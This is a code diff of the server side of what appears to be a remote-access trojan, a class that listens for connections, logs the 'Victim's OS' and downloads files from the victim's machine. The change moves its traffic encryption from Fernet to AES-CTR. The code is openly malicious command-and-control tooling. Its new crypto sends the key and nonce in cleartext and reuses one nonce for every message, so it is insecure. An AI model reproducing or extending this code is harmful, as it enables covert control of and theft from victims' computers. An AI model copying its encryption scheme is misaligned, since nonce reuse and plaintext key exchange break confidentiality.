@@ -1,12 +1,13 @@
 import socket
 import os
 import time
-from cryptography.fernet import Fernet
+from Crypto.Cipher import AES
 
 class EncryptedServer:
     def __init__(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.cipher = None
+        self.key = None
+        self.nonce = None
         self.operating_system = None
         self.conn = None
 
@@ -16,16 +17,18 @@ class EncryptedServer:
         print("[*] Listening for Connections ...")
         self.conn, addr = self.sock.accept()
         print(f"[*] Connection from {addr}")
-        key = self.conn.recv(1024)
-        self.cipher = Fernet(key)
+        self.key = self.conn.recv(32)  # Receive 256-bit key
+        self.nonce = self.conn.recv(12)  # Receive 96-bit nonce
         self.operating_system = self.conn.recv(1024).decode()
         print(f"Victim's OS => {self.operating_system}")
 
     def encrypt(self, data: bytes) -> bytes:
-        return self.cipher.encrypt(data)
+        cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.nonce)
+        return cipher.encrypt(data)
 
     def decrypt(self, data: bytes) -> bytes:
-        return self.cipher.decrypt(data)
+        cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.nonce)
+        return cipher.decrypt(data)
 
     def download(self,filename):
         file_size = int(self.decrypt(self.conn.recv(1024)).decode())
